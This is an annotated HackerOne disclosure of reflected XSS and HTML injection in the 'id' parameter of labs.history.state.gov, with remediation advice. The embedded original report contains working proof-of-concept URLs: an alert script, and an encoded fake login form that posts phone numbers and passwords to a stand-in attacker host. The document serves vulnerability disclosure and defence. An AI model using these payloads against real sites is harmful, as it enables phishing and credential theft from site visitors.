# XSS and HTML Injection via /card.xq?id= Parameter on labs.history.state.gov

## Metadata
- **Source:** HackerOne
- **Report:** 1810656 | https://hackerone.com/reports/1810656
- **Submitted:** 2022-12-20
- **Reporter:** iismailu
- **Program:** U.S. Department of State (Bug Bounty Program)
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS) - Reflected, HTML Injection, Improper Input Validation, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
The /card.xq endpoint on labs.history.state.gov fails to sanitize the 'id' parameter, allowing attackers to inject arbitrary HTML and JavaScript code that executes in users' browsers. The vulnerability can be exploited to conduct phishing attacks, steal credentials, or perform malicious actions on behalf of users visiting crafted malicious URLs.

## Attack scenario
1. Attacker crafts a malicious URL containing HTML/JavaScript payload in the 'id' parameter (e.g., /card.xq?id=<script>alert(document.domain)</script>)
2. Attacker distributes the URL via phishing email, social media, or other social engineering channels targeting State Department users
3. Victim clicks the malicious link and visits the crafted URL on labs.history.state.gov
4. The server reflects the unsanitized payload back in the page response without encoding
5. Victim's browser executes the injected JavaScript, allowing attacker to steal session cookies, credentials, or redirect to phishing page
6. Attacker uses stolen credentials or session tokens to access victim's account or sensitive information

## Root cause
The application fails to properly validate and encode user input from the 'id' query parameter before including it in the HTML response. The backend does not implement input sanitization or output encoding mechanisms, and the vulnerable jQuery 1.11.3 library may lack modern XSS protections.

## Attacker mindset
An attacker would recognize this as a low-effort, high-impact vulnerability affecting a government domain. They could easily craft phishing pages mimicking State Department portals to harvest credentials, or inject malware to compromise user systems. The government target makes this particularly attractive for nation-state or sophisticated threat actors.

## Defensive takeaways
- Implement strict input validation and whitelist acceptable values for the 'id' parameter
- Apply context-appropriate output encoding (HTML entity encoding) to all user-controlled data before rendering in HTML context
- Upgrade jQuery from 1.11.3 to a current version (3.x or later) to eliminate known vulnerabilities
- Deploy a Content Security Policy (CSP) header to restrict inline script execution and limit script sources
- Use security headers (X-XSS-Protection, X-Content-Type-Options) as defense-in-depth measures
- Implement server-side templating engines that auto-escape by default
- Conduct regular security code reviews and automated SAST scanning for injection vulnerabilities
- Perform penetration testing focusing on parameter injection across all user-facing endpoints

## Variant hunting
Search for similar patterns across other .xq endpoints and any other query parameters (name, search, query, etc.). Check for reflected XSS in error pages, redirect parameters, and any dynamically generated content. Test other State Department subdomains and legacy applications for identical vulnerable patterns.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing
- T1566 - Phishing
- T1204 - User Execution
- T1539 - Steal Web Session Cookie

## Notes
This is a straightforward reflected XSS vulnerability on a high-profile government target. The POCs are functional and clearly demonstrate both HTML injection and JavaScript execution. The reporter correctly identified the vulnerable jQuery library version as a contributing factor. Response time from HackerOne indicates this was likely triaged and remediated, but the writeup lacks evidence of patching timeline or confirmation of fix.

## Full report
<details><summary>Expand</summary>

## Summary:
there's possible xss and html injection on your  website https://labs.history.state.gov    through /card.xq?id= parameter
because your web did not sanatize user input  and you have vulnerable  JavaScript libraries jQuery 1.11.3
 
## Steps To Reproduce:


  ## html injection P O C code
https://labs.history.state.gov/card.xq?id=%3C/title%3E%3Cbody%20style=%22background:%20green;%22%3E%3Cdiv%20class=%22container%22%3E%3Cform%20action=%22https://www.evil.com%22%20method=%22post%22%20class=%22form%22%20style=%22display:%20block;%22%3E%3Clabel%20for=%22pnumber%22%3Ephone%20number%20%3C/label%3E%3Cbr%3E%3Cinput%20type=%22tel%22%20name=%22pnumber%22%20id=%22pnumber%22%20value=%22%22%20placeholder=%22phone%20number%22%20maxlength=%2211%22inputmode=%22tel%22%20size=%2240px%22%3E%3Cbr%3E%3Clabel%20for=%22pword%22%3Epassword%3C/label%3E%3Cbr%3E%3Cinput%20type=%22password%22%20name=%22pword%22%20id=%22pword%22%20value=%22%22%20placeholder=%22password%22%20maxlength=%22200%22%20size=%2240px%22height=%22100px%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%20value=%22login%22%3E%3C/form%3E%3C/div%3E%3Cfont%20style=%22font-size:%20100px;color:%20red;%22%20class=%22welcome%22%3EWE%20ARE%20HACKERONE%3C/font%3E
  
  ## xss P O C code
https://labs.history.state.gov/card.xq?id=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E

##Remediation Guidance
1.   you have to sanitize user input before using it 
2.   update your  JavaScript libraries jQuery 1.11.3 
## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

1.. since html is a web language attacker can use this to change complete page look to do phishing attacks to compromise users
2.. attacker can use this to execute malicious javascript in user browser

</details>

---
*Analysed by Claude on 2026-05-12*
